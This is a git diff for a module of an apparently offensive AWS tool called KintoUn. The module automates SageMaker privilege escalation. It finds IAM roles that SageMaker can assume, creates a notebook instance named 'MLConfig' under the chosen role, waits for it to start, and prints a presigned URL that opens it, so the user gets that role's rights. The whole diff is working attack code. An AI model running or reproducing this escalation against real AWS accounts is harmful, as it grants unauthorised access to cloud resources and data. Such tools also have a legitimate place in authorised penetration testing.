@@ -1,5 +1,6 @@
 import json
 import sys
+from time import sleep
 from sympy import EX
 import boto3
 import datetime 
@@ -36,7 +37,7 @@ def check_permissions(selected_session):
     else:
         return False 
 
-def check_assumable_roles(botoconfig, session, selected_session):
+def check_assumable_roles(botoconfig, session):
     service = 'iam'
     client = create_client(botoconfig, session, service)
     assumable_roles = iam_enumerate_assume_role.get_assumable_roles(client)
@@ -47,7 +48,7 @@ def check_assumable_roles(botoconfig, session, selected_session):
         try:
             if role['AssumeRolePolicyDocument']:
                 for principal in role['AssumeRolePolicyDocument']['Statement']:
-                    if principal['Principal']['Service'] == 'lambda.amazonaws.com':
+                    if principal['Principal']['Service'] == 'sagemaker.amazonaws.com':
                         sage_maker_assumable_roles.append(role['Arn'])
         except:
             next
@@ -71,37 +72,92 @@ def parse_assumable_role_option(role_list):
             return False
         selected_option = int(selected_option)
         role_name = role_options[str(selected_option)]
+
+        return role_name
+
     else:
-        print("NO ROLE TO SELECT")
+        print(Fore.RED + "[-] No roles to impersonate found..." + Style.RESET_ALL)
 
-    print(role_name)
+def create_notebook(botoconfig, session, attack_role):
+    service = 'sagemaker'
+    region = input("Please specify a region to create the notebook: ")
+    try:
+        client = session.client(service, config=botoconfig, region_name=region)
+        notebook_arn = client.create_notebook_instance(
+            NotebookInstanceName='MLConfig',
+            InstanceType='ml.t2.medium',
+            RoleArn=attack_role
+        )
+        return notebook_arn, client
 
-def create_notebook():
-    # We create a notebook and pass the selected role to it
-    pass
+    except Exception as e:
+        print("[-] It was "+Fore.RED+"not possible "+Style.RESET_ALL+"to create a notebook...please check if you have the apropriate permissions")
+        print(e)
+        return False
 
-def create_presigned_url():
-    # We create a presigned url to access the notebook from the browser. Maybe this will be deprecated if I can automate this process without the browser.
-    pass
+def check_notebook_status(sagemaker_client):
+    status = sagemaker_client.list_notebook_instances(
+        SortBy='Name',
+        NameContains='MLConfig',
+        StatusEquals='InService'
+    )
 
-def get_jupyter_credentials():
-    # We use the notebooks terminal to get temporary credentials
-    pass
+    if status['NotebookInstances'] == []:
+        return False
+    else:
+        return True
+
+def create_presigned_url(sagemaker_client):
+    try:
+        signed_url = sagemaker_client.create_presigned_notebook_instance_url(
+            NotebookInstanceName='MLConfig'
+        )
+
+        return signed_url
+
+    except Exception as e:
+        print(e)
+
+        return False
 
 def main(botoconfig, session, selected_session):
-    print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)
+    print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
     print("[+] Starting SageMaker privilege escalation module...")
     print("[+] Checking for required permissions...")
 
-    required_permissions = check_permissions(selected_session)
+    try:
+        required_permissions = check_permissions(selected_session)
 
-    if not required_permissions:
-        option = input("\n[-] KintoUn was not able to identity the required permissions...do you want to continue executing the module? [y/N]: ")
-        if not option or option.lower() == "n":
-            print("[-] Exiting module...")
-            return 
-    else:
-        print("[+] Permissions Found! Cheking Assumable Roles...")
-    
-    assumable_roles = check_assumable_roles(botoconfig, session, selected_session)
-    attack_role = parse_assumable_role_option(assumable_roles)
+        if not required_permissions:
+            option = input("\n[-] KintoUn was "+Fore.RED+"not able"+Style.RESET_ALL+" to identity the required permissions...\n[-] This can be due to generic permissions like '*'...\n\nDo you want to continue executing the module? [y/N]: ")
+            if not option or option.lower() == "n":
+                print("[-] Exiting module...")
+                return 
+        else:
+            print("[+] Permissions Found! Cheking Assumable Roles...")
+       
+        print("[+] Checking for roles that can be assumed by SageMaker...")
+        assumable_roles = check_assumable_roles(botoconfig, session)
+        attack_role = parse_assumable_role_option(assumable_roles)
+
+        print("[+] Using the following role to create notebook: "+Fore.GREEN+"{}".format(attack_role)+Style.RESET_ALL)
+        notebook_arn, sagemaker_client = create_notebook(botoconfig, session, attack_role)
+        print("[+] Notebook Arn: "+Fore.GREEN+"{}".format(notebook_arn['NotebookInstanceArn'])+Style.RESET_ALL)
+
+        print("[+] Waiting for notebook to activate...this can take some time...")
+        sagemaker_client = session.client('sagemaker', config=botoconfig, region_name='us-east-1')
+        while True:
+            token = check_notebook_status(sagemaker_client)
+            if token:
+                break
+            else:
+                sleep(10)
+
+        print("[+] Creating pre-signed url for jupyter notebook...")
+        signed_url = create_presigned_url(sagemaker_client)
+        print("[+] Signed Url: "+Fore.GREEN+"{}".format(signed_url['AuthorizedUrl'])+Style.RESET_ALL)
+        
+    except Exception as e:
+        print(e)
+
+        return False
